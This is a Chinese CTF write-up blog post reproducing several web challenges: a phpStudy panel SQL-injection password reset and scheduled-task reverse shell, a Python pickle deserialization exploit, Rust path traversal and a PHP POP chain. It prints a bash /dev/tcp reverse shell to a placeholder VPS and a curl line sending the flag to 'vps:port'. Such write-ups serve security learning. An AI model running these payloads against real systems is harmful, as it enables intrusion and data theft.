{"title":"部分CTF赛题复现","uid":"7dcc2ac2a5074f9dfc556173516085db","slug":"部分CTF题目复现","date":"2023-04-20T07:02:30.000Z","updated":"2023-06-13T17:56:06.000Z","comments":true,"path":"api/articles/部分CTF题目复现.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304211547570.png","content":"<h1 id=\"春秋杯\"><a href=\"#春秋杯\" class=\"headerlink\" title=\"春秋杯\"></a>春秋杯</h1><h2 id=\"Phpstudy\"><a href=\"#Phpstudy\" class=\"headerlink\" title=\"Phpstudy\"></a>Phpstudy</h2><p>之前并未复现这个漏洞，只知道是一个XSS导致的RCE，在比赛时没有思路，现进行复现。</p>\n<p>搭建环境使用Windows，在官网<a href=\"https://www.xp.cn/windows-panel.html%E5%AE%89%E8%A3%85%E5%AE%8C%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF%E5%AE%89%E8%A3%85%E5%8C%85%E5%90%8E%EF%BC%8C%E6%8B%96%E5%85%A5%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%E5%8D%B3%E5%8F%AF\">https://www.xp.cn/windows-panel.html安装完小皮面板安装包后，拖入虚拟机进行安装即可</a></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202235937.png\" alt=\"image-20230520223321111\"></p>\n<p>安装完后我们需要修改<code>account.php</code>文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202301229.png\" alt=\"image-20230520230116190\"></p>\n<p>这里可以发现他这里分配了一个随机码，如果没有这个随机码，我们访问就是404的状态</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202236186.png\" alt=\"image-20230520223623136\"></p>\n<p>这里看一下相关代码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202235269.png\" alt=\"img\"></p>\n<p>可以发现有一个验证是判断<code>HTTP_X_REQUESTED_WITH</code>字段是否为<code>XMLHttpRequest</code>，如果是就正常访问，否则就404，因此我们加上此字段</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202241797.png\" alt=\"image-20230520224121712\"></p>\n<p>此时便可正常访问。</p>\n<p>接下来即可进行密码重置</p>\n<p>payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">admin<span class=\"token string single-quoted-string\">';UPDATE ADMINS set PASSWORD = '</span>c26be8aaf53b15054896983b43eb6a65<span class=\"token string single-quoted-string\">' where username = '</span>admin'<span class=\"token punctuation\">;</span><span class=\"token operator\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202308636.png\" alt=\"image-20230520230803600\"></p>\n<p>此时虽提示密码错误，但已成功重置</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202312714.png\" alt=\"image-20230520231242630\"></p>\n<p>发现这里有计划任务</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305202313412.png\" alt=\"image-20230520231300333\"></p>\n<p>添加语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bash <span class=\"token operator\">-</span>i <span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span><span class=\"token constant\">VPS</span><span class=\"token operator\">/</span>port <span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>反弹shell即可</p>\n<h2 id=\"easypy\"><a href=\"#easypy\" class=\"headerlink\" title=\"easypy\"></a>easypy</h2><p><code>www.zip</code>存在文件泄露，访问后获取到源码，但此时是<code>pyc</code>文件，因此需要进行文件反编译</p>\n<p>安装工具<code>Decompyle6</code>进行反编译，而后获取到源码，具体如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># uncompyle6 version 3.9.0</span>\n<span class=\"token comment\"># Python bytecode version base 3.8.0 (3413)</span>\n<span class=\"token comment\"># Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15) </span>\n<span class=\"token comment\"># [GCC 8.3.0]</span>\n<span class=\"token comment\"># Embedded file name: app.py</span>\n<span class=\"token comment\"># Compiled at: 2023-04-16 15:41:59</span>\n<span class=\"token comment\"># Size of source mod 2**32: 1030 bytes</span>\n<span class=\"token keyword\">import</span> numpy<span class=\"token punctuation\">,</span> base64\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> Response<span class=\"token punctuation\">,</span> request\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'小p想要找一个女朋友，你能帮他找找看么？'</span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/girlfriends'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">girlfriends</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        data <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">)</span>\n        numpydata <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">b'R'</span> <span class=\"token keyword\">in</span> numpydata <span class=\"token keyword\">or</span> <span class=\"token string\">b'bash'</span> <span class=\"token keyword\">in</span> numpydata <span class=\"token keyword\">or</span> <span class=\"token string\">b'sh'</span> <span class=\"token keyword\">in</span> numpydata<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string\">'不能走捷径啊'</span>\n        resp <span class=\"token operator\">=</span> numpy<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>numpydata<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'可以的，要的就是一种感觉'</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'有进步了,但是不多'</span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/download'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">download</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'www.zip'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stream <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    response <span class=\"token operator\">=</span> Response<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">,</span> content_type<span class=\"token operator\">=</span><span class=\"token string\">'application/octet-stream'</span><span class=\"token punctuation\">)</span>\n    response<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Content-disposition'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'attachment;filename=www.zip'</span>\n    <span class=\"token keyword\">return</span> response\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">80</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>numpy.loads</code>，这个可以看出考察点是Python反序列化，这里过滤了<code>R</code>、<code>bash</code>以及<code>sh</code>，所以这里不能再使用<code>R</code>操作符进行操作，这里的话是只执行命令无回显的，所以我们需要进行外带，用curl进行外带即可，用i操作符实现外带，具体payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> base64\n\ndata<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">b'''(S'curl vps:port/`cat /f*`'\nios\nsystem\n.'''</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"ezrust\"><a href=\"#ezrust\" class=\"headerlink\" title=\"ezrust\"></a>ezrust</h2><p>给出了源码，具体如下</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">actix_files<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">NamedFile</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token namespace\">actix_web<span class=\"token punctuation\">::</span></span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">App</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpRequest</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpResponse</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServer</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Responder</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">,</span> web<span class=\"token punctuation\">,</span> get<span class=\"token punctuation\">,</span> post<span class=\"token punctuation\">,</span> guard<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>path<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">PathBuf</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">index</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">:</span> <span class=\"token class-name\">HttpRequest</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">NamedFile</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> path<span class=\"token punctuation\">:</span> <span class=\"token class-name\">PathBuf</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">match_info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filename\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">unwrap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> path<span class=\"token punctuation\">.</span><span class=\"token function\">to_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"REASON\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">to_string</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        path <span class=\"token operator\">=</span> <span class=\"token class-name\">PathBuf</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">NamedFile</span><span class=\"token punctuation\">::</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token attribute attr-name\">#[get(<span class=\"token string\">\"/\"</span>)]</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">impl</span> <span class=\"token class-name\">Responder</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">HttpResponse</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">body</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello world!\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token attribute attr-name\">#[get(<span class=\"token string\">\"/&#123;name&#125;\"</span>)]</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">name</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">:</span> <span class=\"token namespace\">web<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Path</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> name <span class=\"token operator\">=</span> path<span class=\"token punctuation\">.</span><span class=\"token function\">into_inner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome &#123;&#125;!\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token attribute attr-name\">#[actix_web::main]</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">HttpServer</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">App</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">service</span><span class=\"token punctuation\">(</span>hello<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">service</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/&#123;filename:.*&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token namespace\">web<span class=\"token punctuation\">::</span></span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">to</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token keyword\">await</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看到这里</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">NamedFile</span><span class=\"token punctuation\">::</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以发现对文件进行了读取，题目提示了<code>flag在work目录</code>，Vue的Work目录就是当前目录，所以可以直接读取flag,<code>payload</code>如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">xxx<span class=\"token operator\">/</span><span class=\"token operator\">.</span><span class=\"token operator\">/</span>flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"第一届陕西大学生比赛\"><a href=\"#第一届陕西大学生比赛\" class=\"headerlink\" title=\"第一届陕西大学生比赛\"></a>第一届陕西大学生比赛</h1><h2 id=\"ezpop\"><a href=\"#ezpop\" class=\"headerlink\" title=\"ezpop\"></a>ezpop</h2><p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">night</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$night</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">night</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'哒咩哟'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">day</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$day</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token function\">go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">light</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$light</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dark</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dark</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token function\">hacked</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">hacked</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'呆jio步'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\.\\.*/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">ENT_QUOTES</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'UTF-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$un</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'快给我传参pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// </span>\n\n<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'seino'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看到<code>throw new Exception(&#39;seino&#39;);</code>，明显考察的是PHP的GC垃圾回收机制，写完序列化内容后，添加上数组另第二个值为空，而后再修改payload最后的1位为0即可，但这里最坑的点在于，这个题目的POST传参的值带了不可见字符，原题是这样的</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202306040128868.png\" alt=\"image-20230604012808789\"></p>\n<p>让人误以为传参点是<code>pop</code>，所以看好参数名还是很重要的，在这里看了好久才看出来。</p>\n<p>最终Exp</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token 